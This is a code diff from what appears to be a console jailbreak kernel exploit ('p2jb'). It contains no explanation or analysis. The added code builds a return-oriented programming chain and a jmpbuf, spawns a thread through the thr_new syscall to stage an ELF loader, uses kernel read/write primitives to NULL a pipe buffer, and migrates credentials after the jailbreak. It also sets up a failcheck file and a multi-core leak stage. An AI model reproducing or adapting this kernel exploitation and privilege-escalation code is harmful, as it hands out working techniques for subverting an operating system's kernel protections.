+            write64_uncompressed(kexp_chain + ci, kexp_MOV_RDI_RAX); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_POP_RAX); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, SYSCALL.thr_exit); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, kexp_POP_RDI); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, 0n); ci += 8n;
+            write64_uncompressed(kexp_chain + ci, syscall_wrapper); ci += 8n;
+
+            // Build jmpbuf
+            for (var si = 0; si < 0x100; si += 8) write64_uncompressed(kexp_scratch + BigInt(si), 0n);
+            for (var ji = 0; ji < 0x60; ji += 8) write64_uncompressed(kexp_jb + BigInt(ji), kexp_scratch);
+            write64_uncompressed(kexp_jb, kexp_RET);
+            write64_uncompressed(kexp_jb + 0x10n, kexp_chain);
+            write32_uncompressed(kexp_jb + 0x40n, BigInt(kexp_fpu));
+            write32_uncompressed(kexp_jb + 0x44n, BigInt(kexp_mxcsr));
+
+            // Read main thread's fs_base to share with kexp thread
+            var kexp_fsbase_ptr = malloc(8);
+            write64_uncompressed(kexp_fsbase_ptr, 0n);
+            syscall(0xA5n, 128n, kexp_fsbase_ptr);
+            var kexp_fsbase = read64_uncompressed(kexp_fsbase_ptr);
+            logger.log("stage_elfldr_via_kexp: main thread fs_base=" + hex(kexp_fsbase));
+
+            // Build thr_param
+            for (var ti = 0n; ti < 0x68n; ti += 8n) write64_uncompressed(kexp_thr_param + ti, 0n);
+            write64_uncompressed(kexp_thr_param + 0x00n, kexp_longjmp);
+            write64_uncompressed(kexp_thr_param + 0x08n, kexp_jb);
+            write64_uncompressed(kexp_thr_param + 0x10n, kexp_stack);
+            write64_uncompressed(kexp_thr_param + 0x18n, BigInt(0x80000 + 0x200 * 8));
+            write64_uncompressed(kexp_thr_param + 0x20n, kexp_fsbase);  // tls_base
+            write64_uncompressed(kexp_thr_param + 0x28n, 0x1000n);      // tls_size
+            write64_uncompressed(kexp_tid, 0n);
+            write64_uncompressed(kexp_thr_param + 0x30n, kexp_tid);    // child_tid
+            write64_uncompressed(kexp_thr_param + 0x38n, kexp_tid);    // parent_tid
+
+            var thr_ret = syscall(SYSCALL.thr_new, kexp_thr_param, 0x68n);
+            logger.log("stage_elfldr_via_kexp: thr_new ret=" + hex(thr_ret));
+
+            nanosleep_ms(500);
+
+            var tid = read64_uncompressed(kexp_tid);
+            var ret = read64_uncompressed(kexp_flag);
+            logger.log("tid=" + hex(tid) + " flag=" + hex(ret));
+
+            logger.log("stage_elfldr_via_kexp: complete");
+        }
+
+        function post_jb_null_master_pipe(S) {
             try {
                 const buf_before = S.kread64(S.master_pipe_data + 0x10n);
                 S.kwrite64(S.master_pipe_data + 0x10n, 0n);
-            logger.log("post-jb: master.pipe_buffer.buffer NULL'd " +
-                "(was " + toHex(buf_before) + " = victim_pipe_data, " +
-                    "kernel free-path will now skip vm_map_remove)");
+                logger.log("post-jb: master.pipe_buffer.buffer NULL'd " +
+                    "(was " + toHex(buf_before) + " = victim_pipe_data, " +
+                        "kernel free-path will now skip vm_map_remove)");
             } catch (e) {
                 logger.log("post-jb: pipe_buffer restore failed: " + e.message +
                     " (jailbreak unaffected)");
@@ -2909,16 +2013,12 @@ function update_kernel_offsets() {
                 return;
             }
 
-            // failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
-            // logger.log("XXX failcheck path: " + failcheck_path);
-            // if (file_exists(failcheck_path)) {
-            //     logger.log("aborting, failcheck path exists: " + failcheck_path);
-            //     // return;
-            // }
-            // logger.log("XXX about to write to: " + failcheck_path);
-            // // nanosleep_ms(5000);
-            // write_file(failcheck_path, "");
-            // logger.log("XXX wrote to: " + failcheck_path);
+            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
+            if (file_exists(failcheck_path)) {
+                logger.log("aborting, failcheck path exists: " + failcheck_path);
+                return;
+            }
+            write_file(failcheck_path, "");
         } catch (_) { failcheck_path = null; }
 
         logger.log(p2jb_version +" FW: " + FW_VERSION);
@@ -2927,7 +2027,6 @@ function update_kernel_offsets() {
 
         my_init_threading();
 
-        const S = make_state();
         setup_cpu_masks(S);
         setup_worker_sockets(S);
         setup_iov_buffers(S);
@@ -2956,6 +2055,7 @@ function update_kernel_offsets() {
         }
         const eta_str =  eta_minutes + " min";
         logger.log("host OK - starting " + leak_nw + "-core leak, ETA to stage0 ~" + eta_str);
+        send_notification("starting " + leak_nw + "-core leak, ETA to stage0 ~" + eta_str);
 
         prepare_fds(S);
         stage0(S);
@@ -2976,27 +2076,11 @@ function update_kernel_offsets() {
         pin_to_core(S.orig_main_core);
         logger.log("restored main thread to core " + S.orig_main_core);
 
-        force_td_ucred_migrate(S);
+        post_jb_migrate_ucred(S);
 
-        {
-            logger.log("p2jb handoff: ipv6_kernel_rw init for elf_loader");
-            kernel.addr.data_base = S.data_base;
-            ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
-            logger.log("p2jb handoff: ipv6_kernel_rw built (master_sock=" +
-                ipv6_kernel_rw.data.master_sock + " victim_sock=" +
-                ipv6_kernel_rw.data.victim_sock + ")");
+        stage_elfldr_via_kexp(S);
 
-            const pin_sock = (fd) => {
-                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
-                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
-                const so = S.kread64(fp);
-                if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
-                S.kwrite32(so, 0x100);
-            };
-            pin_sock(ipv6_kernel_rw.data.master_sock);
-            pin_sock(ipv6_kernel_rw.data.victim_sock);
-            logger.log("p2jb handoff: handoff pipe + sockets pinned");
-        }
+        post_jb_null_master_pipe(S);
 
         logger.log("=== p2jb complete ===");
     } catch (e) {
